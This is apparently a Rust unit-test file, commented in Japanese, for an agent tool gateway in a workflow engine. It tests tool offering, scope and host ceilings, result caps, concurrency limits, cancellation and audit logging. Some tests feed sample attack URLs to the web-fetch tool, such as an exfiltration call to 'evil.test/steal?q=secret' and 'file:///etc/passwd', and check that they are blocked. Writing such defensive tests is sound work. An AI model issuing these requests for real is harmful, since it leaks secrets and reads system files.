//! agent.invoke の executor と道具の口（AgentToolGateway）の単体テスト（fake ポート・DB 不要・BUG-6）。
//!
//! fake の `agent_invoke` はループの代わりに、仕込んだ道具の呼び出しをゲートウェイへ順に流す。
//! 検証: 道具の提示（省略は道具なし・scope 天井・web の天井）・提示していない道具の拒否・宛先の照合・
//! 結果の上限・同時実行の枠・止める合図・上限の丸め・監査（via=agent）。

#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::pedantic,
    clippy::print_stderr
)]

use std::sync::{Arc, Mutex};

use async_trait::async_trait;
use serde_json::{json, Value};
use sqlx::postgres::PgPoolOptions;
use tokio::sync::Notify;
use uuid::Uuid;
use workflow_engine::nodes::ports::{
    AgentInvokeReq, CsvPatchReq, CsvWriteReq, ExecCtx, HttpSendReq, HttpSendResp, LlmInvokeReq,
    NodePorts, PortError, ResolvedSecretView, StorageWriteReq,
};
use workflow_engine::vocab::{AgentTool, MAX_TOOL_RESULT_CHARS};
use workflow_engine::{
    AgentLimits, AgentToolGateway, CapabilityAudit, CapabilityNodeExecutor, EffectJournal,
    NodeContext, NodeExecutor, WebFetchReq,
};

#[derive(Default)]
struct CapturingAudit {
    records: Mutex<Vec<(String, bool, Value)>>,
    out_of_scope: Mutex<Vec<String>>,
}
impl CapabilityAudit for CapturingAudit {
    fn record(&self, _tenant_id: &str, api: &str, allowed: bool, meta: &Value) {
        self.records
            .lock()
            .unwrap()
            .push((api.to_string(), allowed, meta.clone()));
    }
    fn record_out_of_scope(&self, _ec: &ExecCtx, api: &str, _meta: &Value) {
        self.out_of_scope.lock().unwrap().push(api.to_string());
    }
}

/// ループの代わり: 仕込んだ道具の呼び出しをゲートウェイへ流し、結果を出力に載せる。
#[derive(Default)]
struct AgentPorts {
    calls: Mutex<Vec<(AgentTool, Value)>>,
    offered: Mutex<Vec<String>>,
    cancelled_seen: Mutex<Option<bool>>,
    last_req: Mutex<Option<AgentInvokeReq>>,
    fetched: Mutex<Vec<String>>,
    /// 立っていれば agent_invoke は解放されるまで待つ（同時実行の枠の検証）。
    hold: Option<Arc<Notify>>,
    entered: Arc<Notify>,
    huge_results: bool,
}

#[async_trait]
impl NodePorts for AgentPorts {
    async fn storage_write(&self, _: &ExecCtx, _: StorageWriteReq) -> Result<Value, PortError> {
        unreachable!("書込の道具は無い")
    }
    async fn storage_read(&self, _: &ExecCtx, _: Uuid) -> Result<Value, PortError> {
        unreachable!()
    }
    async fn storage_list(&self, _: &ExecCtx, _: Option<Uuid>) -> Result<Value, PortError> {
        let n = if self.huge_results { 5_000 } else { 1 };
        let items: Vec<Value> = (0..n)
            .map(|i| json!({ "id": format!("{i:08}"), "name": "ファイル名のそこそこ長い例.txt" }))
            .collect();
        Ok(json!({ "items": items }))
    }
    async fn rag_search(
        &self,
        _: &ExecCtx,
        query: &str,
        top_k: Option<u32>,
    ) -> Result<Value, PortError> {
        let content = if self.huge_results {
            "本".repeat(10_000)
        } else {
            format!("「{query}」の断片")
        };
        Ok(
            json!({ "results": [{ "file_id": "f1", "file_name": "規程.md", "content": content, "score": 1.0 }],
                   "top_k": top_k }),
        )
    }
    async fn llm_invoke(&self, _: &ExecCtx, _: LlmInvokeReq) -> Result<Value, PortError> {
        unreachable!()
    }
    async fn agent_invoke(
        &self,
        _: &ExecCtx,
        req: AgentInvokeReq,
        tools: Arc<dyn AgentToolGateway>,
    ) -> Result<Value, PortError> {
        self.entered.notify_one();
        if let Some(hold) = &self.hold {
            hold.notified().await;
        }
        *self.offered.lock().unwrap() = tools
            .tools()
            .iter()
            .map(|t| t.as_str().to_string())
            .collect();
        *self.cancelled_seen.lock().unwrap() = Some(tools.is_cancelled());
        *self.last_req.lock().unwrap() = Some(req);
        let calls = self.calls.lock().unwrap().clone();
        let mut results = Vec::new();
        for (tool, args) in calls {
            results.push(match tools.call(tool, &args).await {
                Ok(v) => json!({ "tool": tool.as_str(), "ok": true, "out": v }),
                Err(e) => json!({ "tool": tool.as_str(), "ok": false, "code": e.code, "message": e.message }),
            });
        }
        Ok(
            json!({ "text": "答え", "stop": "completed", "results": results, "skipped_tools": ["code.run"] }),
        )
    }
    async fn http_send(&self, _: &ExecCtx, _: HttpSendReq) -> Result<HttpSendResp, PortError> {
        unreachable!()
    }
    async fn resolve_secret(&self, _: &ExecCtx, _: &str) -> Result<ResolvedSecretView, PortError> {
        unreachable!()
    }
    async fn skill_resolve(
        &self,
        _: &ExecCtx,
        _: &str,
        _: &str,
    ) -> Result<workflow_engine::nodes::ResolvedSkillView, PortError> {
        unreachable!()
    }
    async fn workflow_start(&self, _: &ExecCtx, _: &str, _: &Value) -> Result<Value, PortError> {
        unreachable!()
    }
    async fn csv_query(&self, _: &ExecCtx, _: Uuid, _: &str) -> Result<Value, PortError> {
        unreachable!()
    }
    async fn csv_patch(&self, _: &ExecCtx, _: CsvPatchReq) -> Result<Value, PortError> {
        unreachable!()
    }
    async fn csv_write(&self, _: &ExecCtx, _: CsvWriteReq) -> Result<Value, PortError> {
        unreachable!()
    }
    async fn web_fetch(&self, _: &ExecCtx, req: WebFetchReq) -> Result<Value, PortError> {
        self.fetched.lock().unwrap().push(req.url.clone());
        Ok(json!({ "url": req.url, "text": "ページの本文" }))
    }
}

fn lazy_journal() -> EffectJournal {
    let pool = PgPoolOptions::new()
        .connect_lazy("postgres://unused:unused@127.0.0.1:1/none")
        .unwrap();
    EffectJournal::new(pool)
}

fn executor(
    ports: Arc<AgentPorts>,
    audit: Arc<CapturingAudit>,
    limits: AgentLimits,
) -> CapabilityNodeExecutor {
    CapabilityNodeExecutor::new(ports, lazy_journal(), audit).with_agent_limits(limits)
}

fn web_limits(hosts: &[&str]) -> AgentLimits {
    AgentLimits {
        web_ceiling: hosts.iter().map(ToString::to_string).collect(),
        ..AgentLimits::default()
    }
}

fn ctx(scopes: &[&str]) -> NodeContext {
    NodeContext {
        tenant_id: "t1".into(),
        org: "acme".into(),
        run_id: Uuid::nil(),
        run_started_at: chrono::Utc::now(),
        step_path: "ag".into(),
        idempotency_key: "wf:t1:0:ag".into(),
        attempt: 2,
        principal: "alice".into(),
        principal_kind: "user".into(),
        input: json!({ "topic": "経費" }),
        trigger: json!({}),
        node_outputs: Value::Null,
        each: None,
        trace_id: Some("trace-1".into()),
        scope_ceiling: scopes.iter().map(ToString::to_string).collect(),
        cancel: workflow_engine::CancelSignal::default(),
        workflow_id: Uuid::nil(),
        cache: None,
    }
}

/// 道具を省略すると何も提示しない（旧 IR の到達範囲を再同意なしに広げない・D-29）。
#[tokio::test]
async fn omitted_tools_offer_nothing() {
    let ports = Arc::new(AgentPorts::default());
    let exec = executor(
        Arc::clone(&ports),
        Arc::new(CapturingAudit::default()),
        AgentLimits::default(),
    );
    let res = exec
        .execute(
            "agent.invoke",
            &json!({ "instruction": "要点をまとめて" }),
            &ctx(&["rag.query"]),
        )
        .await;
    assert!(res.ok, "{:?}", res.error);
    assert!(ports.offered.lock().unwrap().is_empty());
    // ポートが外した道具（未配線）はそのまま残る。
    assert_eq!(res.output["skipped_tools"], json!(["code.run"]));
    assert_eq!(res.output["text"], "答え");
}

/// scope 天井の外の道具と、天井が空の web.fetch は提示しない（skipped_tools に出す）。
#[tokio::test]
async fn tools_outside_the_ceilings_are_not_offered() {
    let ports = Arc::new(AgentPorts::default());
    let audit = Arc::new(CapturingAudit::default());
    let exec = executor(Arc::clone(&ports), Arc::clone(&audit), web_limits(&[]));
    let params = json!({ "instruction": "x",
        "allowed_tools": ["rag.search", "storage.read", "web.fetch", "rag.search"],
        "egress_allowlist": ["docs.example.com"] });
    let res = exec
        .execute("agent.invoke", &params, &ctx(&["rag.query", "http.egress"]))
        .await;
    assert!(res.ok, "{:?}", res.error);
    assert_eq!(
        *ports.offered.lock().unwrap(),
        vec!["rag.search".to_string()]
    );
    assert_eq!(
        res.output["skipped_tools"],
        json!(["storage.read", "web.fetch", "code.run"])
    );
    // 天井の外の指定は監査に残す（保存時に宣言は補われるので、宣言を外した IR だけがここに来る）。
    assert_eq!(
        *audit.out_of_scope.lock().unwrap(),
        vec!["storage.read".to_string()]
    );
    let node = audit
        .records
        .lock()
        .unwrap()
        .iter()
        .find(|(api, _, _)| api == "agent.invoke")
        .cloned()
        .expect("ノードの監査");
    assert_eq!(node.2["tools"], json!(["rag.search"]));
    assert!(
        node.2.get("instruction").is_none(),
        "依頼の本文は監査に載せない"
    );
}

/// 提示していない道具の呼び出しは invalid（監査 not_offered）。提示した道具は via=agent で監査される。
#[tokio::test]
async fn calls_are_checked_against_the_offered_tools() {
    let ports = Arc::new(AgentPorts::default());
    *ports.calls.lock().unwrap() = vec![
        (
            AgentTool::RagSearch,
            json!({ "query": "旅費", "top_k": 99 }),
        ),
        (AgentTool::StorageList, json!({})),
        (AgentTool::CodeRun, json!({ "code": "print(1)" })),
    ];
    let audit = Arc::new(CapturingAudit::default());
    let exec = executor(
        Arc::clone(&ports),
        Arc::clone(&audit),
        AgentLimits::default(),
    );
    let params = json!({ "instruction": "x", "allowed_tools": ["rag.search"] });
    let res = exec
        .execute(
            "agent.invoke",
            &params,
            &ctx(&["rag.query", "storage.read", "sandbox.exec"]),
        )
        .await;
    assert!(res.ok, "{:?}", res.error);
    let results = res.output["results"].as_array().unwrap();
    assert_eq!(results[0]["ok"], true);
    // top_k は 20 までに丸める。
    assert_eq!(results[0]["out"]["top_k"], 20);
    for r in &results[1..] {
        assert_eq!(r["ok"], false, "{r}");
        assert_eq!(r["code"], "invalid", "{r}");
    }
    let records = audit.records.lock().unwrap();
    assert!(records
        .iter()
        .any(|(api, ok, meta)| api == "rag.search" && *ok && meta["via"] == "agent"));
    for api in ["storage.list", "code.run"] {
        assert!(
            records
                .iter()
                .any(|(a, ok, meta)| a == api && !*ok && meta["reason"] == "not_offered"),
            "{api}: {records:?}"
        );
    }
}

/// web.fetch の宛先は「ノードの指定 ∩ 管理者の天井」だけ。外れたら forbidden（監査 host_not_allowed）。
#[tokio::test]
async fn web_fetch_stays_inside_the_ceiling() {
    let ports = Arc::new(AgentPorts::default());
    *ports.calls.lock().unwrap() = vec![
        (
            AgentTool::WebFetch,
            json!({ "url": "https://docs.example.com/guide" }),
        ),
        (
            AgentTool::WebFetch,
            json!({ "url": "https://evil.test/steal?q=secret" }),
        ),
        (
            AgentTool::WebFetch,
            json!({ "url": "https://other.example.org/" }),
        ),
        (AgentTool::WebFetch, json!({ "url": "file:///etc/passwd" })),
    ];
    let audit = Arc::new(CapturingAudit::default());
    let exec = executor(
        Arc::clone(&ports),
        Arc::clone(&audit),
        web_limits(&["*.example.com"]),
    );
    // other.example.org は天井の外なので、ノードに書いても読めない（縮小のみ）。
    let params = json!({ "instruction": "x", "allowed_tools": ["web.fetch"],
        "egress_allowlist": ["docs.example.com", "other.example.org"] });
    let res = exec
        .execute("agent.invoke", &params, &ctx(&["http.egress"]))
        .await;
    assert!(res.ok, "{:?}", res.error);
    let results = res.output["results"].as_array().unwrap();
    assert_eq!(results[0]["ok"], true);
    assert_eq!(results[1]["code"], "forbidden");
    assert_eq!(results[2]["code"], "forbidden");
    assert_eq!(results[3]["code"], "invalid");
    assert_eq!(
        *ports.fetched.lock().unwrap(),
        vec!["https://docs.example.com/guide".to_string()]
    );
    let records = audit.records.lock().unwrap();
    assert!(records.iter().any(|(api, ok, meta)| api == "web.fetch"
        && !*ok
        && meta["reason"] == "host_not_allowed"
        && meta["detail"] == "evil.test"));
}

/// 天井の完全一致のホストは、そのサブドメインのワイルドカードを含まない（ノードの `*.H` は外す）。
#[tokio::test]
async fn an_exact_ceiling_host_does_not_admit_its_subdomains() {
    let ports = Arc::new(AgentPorts::default());
    *ports.calls.lock().unwrap() = vec![
        (
            AgentTool::WebFetch,
            json!({ "url": "https://anything.docs.example.com/?q=secret" }),
        ),
        (
            AgentTool::WebFetch,
            json!({ "url": "https://docs.example.com/guide" }),
        ),
    ];
    let audit = Arc::new(CapturingAudit::default());
    let exec = executor(
        Arc::clone(&ports),
        Arc::clone(&audit),
        web_limits(&["docs.example.com"]),
    );
    let params = json!({ "instruction": "x", "allowed_tools": ["web.fetch"],
        "egress_allowlist": ["*.docs.example.com", "docs.example.com"] });
    let res = exec
        .execute("agent.invoke", &params, &ctx(&["http.egress"]))
        .await;
    assert!(res.ok, "{:?}", res.error);
    let results = res.output["results"].as_array().unwrap();
    assert_eq!(results[0]["code"], "forbidden", "{results:?}");
    assert_eq!(results[1]["ok"], true, "{results:?}");
    assert_eq!(
        *ports.fetched.lock().unwrap(),
        vec!["https://docs.example.com/guide".to_string()]
    );
}

/// 道具の結果には上限を掛ける（社内検索の 1 件は短く、全体は切って目印を付ける）。
#[tokio::test]
async fn tool_results_are_capped() {
    let ports = Arc::new(AgentPorts {
        huge_results: true,
        ..AgentPorts::default()
    });
    *ports.calls.lock().unwrap() = vec![
        (AgentTool::RagSearch, json!({ "query": "q" })),
        (AgentTool::StorageList, json!({})),
    ];
    let exec = executor(
        Arc::clone(&ports),
        Arc::new(CapturingAudit::default()),
        AgentLimits::default(),
    );
    let params = json!({ "instruction": "x", "allowed_tools": ["rag.search", "storage.list"] });
    let res = exec
        .execute(
            "agent.invoke",
            &params,
            &ctx(&["rag.query", "storage.read"]),
        )
        .await;
    assert!(res.ok, "{:?}", res.error);
    let results = res.output["results"].as_array().unwrap();
    let snippet = results[0]["out"]["results"][0]["content"].as_str().unwrap();
    assert!(
        snippet.chars().count() <= 1_501,
        "{}",
        snippet.chars().count()
    );
    let listed = &results[1]["out"];
    assert_eq!(listed["truncated"], true, "{listed}");
    assert_eq!(
        listed["partial"].as_str().map(|s| s.chars().count()),
        Some(MAX_TOOL_RESULT_CHARS)
    );
}

/// 同時実行の枠が埋まっていれば concurrency_limited（attempt を消費しない順番待ち）。他の step は進む。
#[tokio::test]
async fn the_concurrency_slot_queues_extra_agents() {
    let hold = Arc::new(Notify::new());
    let ports = Arc::new(AgentPorts {
        hold: Some(Arc::clone(&hold)),
        ..AgentPorts::default()
    });
    let exec = Arc::new(executor(
        Arc::clone(&ports),
        Arc::new(CapturingAudit::default()),
        AgentLimits {
            max_concurrent: 1,
            ..AgentLimits::default()
        },
    ));
    let first = {
        let exec = Arc::clone(&exec);
        tokio::spawn(async move {
            exec.execute(
                "agent.invoke",
                &json!({ "instruction": "1 本目" }),
                &ctx(&[]),
            )
            .await
        })
    };
    ports.entered.notified().await;
    let second = exec
        .execute(
            "agent.invoke",
            &json!({ "instruction": "2 本目" }),
            &ctx(&[]),
        )
        .await;
    assert!(!second.ok);
    let e = second.error.unwrap();
    assert_eq!(e.code, "concurrency_limited");
    assert!(e.retryable);
    assert_eq!(
        workflow_engine::classify(&e.code, e.retryable),
        workflow_engine::RetryClass::RateLimited,
        "attempt を消費しない"
    );
    // 枠は agent.invoke のものだけ（他の種類の step は止めない）。
    let branch = exec
        .execute(
            "control.branch",
            &json!({ "condition": { "cmp": { "left": 1, "op": "eq", "right": 1 } } }),
            &ctx(&[]),
        )
        .await;
    assert!(branch.ok);
    hold.notify_one();
    assert!(first.await.unwrap().ok);
    // 枠は返っている。
    let third = Arc::new(AgentPorts::default());
    let exec3 = executor(
        third,
        Arc::new(CapturingAudit::default()),
        AgentLimits {
            max_concurrent: 1,
            ..AgentLimits::default()
        },
    );
    assert!(
        exec3
            .execute("agent.invoke", &json!({ "instruction": "3" }), &ctx(&[]))
            .await
            .ok
    );
}

/// 止める合図（取り消し・リースの喪失）はゲートウェイの is_cancelled でループへ届く。
#[tokio::test]
async fn the_cancel_signal_reaches_the_loop() {
    let ports = Arc::new(AgentPorts::default());
    let exec = executor(
        Arc::clone(&ports),
        Arc::new(CapturingAudit::default()),
        AgentLimits::default(),
    );
    let c = ctx(&[]);
    assert!(
        exec.execute("agent.invoke", &json!({ "instruction": "x" }), &c)
            .await
            .ok
    );
    assert_eq!(*ports.cancelled_seen.lock().unwrap(), Some(false));
    c.cancel.cancel();
    assert!(
        exec.execute("agent.invoke", &json!({ "instruction": "x" }), &c)
            .await
            .ok
    );
    assert_eq!(*ports.cancelled_seen.lock().unwrap(), Some(true));
}

/// 上限はデプロイ設定を天井に丸め、ノード設定は縮めるだけ。依頼が空なら実行しない。
#[tokio::test]
async fn limits_are_rounded_to_the_ceilings() {
    let ports = Arc::new(AgentPorts::default());
    let limits = AgentLimits {
        default_max_steps: 5,
        max_total_tokens: 10_000,
        max_cost_usd_micros: 123,
        ..AgentLimits::default()
    };
    let exec = executor(
        Arc::clone(&ports),
        Arc::new(CapturingAudit::default()),
        limits,
    );
    let params = json!({ "instruction": { "$template": "{t} の規程を調べて", "vars": { "t": { "$from": "input", "path": "/topic" } } },
        "max_tokens": 999_999, "max_duration_sec": 99_999, "context": { "file_id": "abc" } });
    let res = exec.execute("agent.invoke", &params, &ctx(&[])).await;
    assert!(res.ok, "{:?}", res.error);
    let req = ports.last_req.lock().unwrap().clone().unwrap();
    assert_eq!(req.instruction, "経費 の規程を調べて");
    assert_eq!(req.max_steps, 5, "省略はデプロイ設定の既定");
    assert_eq!(
        req.max_total_tokens, 10_000,
        "デプロイ設定より大きくできない"
    );
    assert_eq!(req.max_cost_usd_micros, 123);
    assert_eq!(req.max_duration_ms, 3_600_000, "3600 秒まで");
    assert_eq!(req.attempt, 2);
    assert_eq!(req.context, Some(json!({ "file_id": "abc" })));
    let res = exec
        .execute(
            "agent.invoke",
            &json!({ "instruction": "x", "max_steps": 99, "max_tokens": 100 }),
            &ctx(&[]),
        )
        .await;
    assert!(res.ok);
    let req = ports.last_req.lock().unwrap().clone().unwrap();
    assert_eq!((req.max_steps, req.max_total_tokens), (24, 100));
    let empty = exec
        .execute("agent.invoke", &json!({ "instruction": "  " }), &ctx(&[]))
        .await;
    assert!(!empty.ok);
    assert_eq!(empty.error.unwrap().code, "invalid");
}
